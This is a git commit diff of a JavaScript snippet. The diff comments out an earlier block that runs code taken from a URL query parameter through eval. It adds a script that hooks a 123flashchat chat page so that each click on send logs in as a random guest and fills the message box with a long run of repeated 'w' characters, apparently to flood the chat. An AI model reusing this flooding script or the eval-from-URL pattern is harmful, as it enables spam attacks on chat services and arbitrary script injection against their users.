412aa044dfc0265f8e4a0e5506162de97dbd7c34
pouriazareie <pouria.zareie@gmail.com>
2019-09-20 19:08:01 +0430

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,16 @@
 <script>
-    window.onload = function () {
+/*     window.onload = function () {
         var url = new URL(window.location.href);
         var script = url.searchParams.get("script");
         console.log(script);
         eval(script)
-    }    
+		
+		 }   */
+		document.getElementById("topcmm-123flashchat-main-send-msg-btn").addEventListener("click", function(){
+
+
+document.getElementById("topcmm-123flashchat-settings-menuitem-signin").click();document.getElementById("topcmm-123flashchat-loginview-username-input").value=Math.random().toString(36).substr(2, 5);document.getElementById("topcmm-123flashchat-sign-in-guest-checkbox-block").style="display: show;";
+document;document.getElementById("topcmm-123flashchat-loginview-guest-checkbox").click();document.getElementById("topcmm-123flashchat-loginview-username-input").value=Math.random().toString(36).substr(2, 5);document.getElementById("topcmm-123flashchat-loginview-login-btn").click();document.getElementById("topcmm-123flashchat-main-message-input").innerHTML="wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww";
+});
+     
 </script>
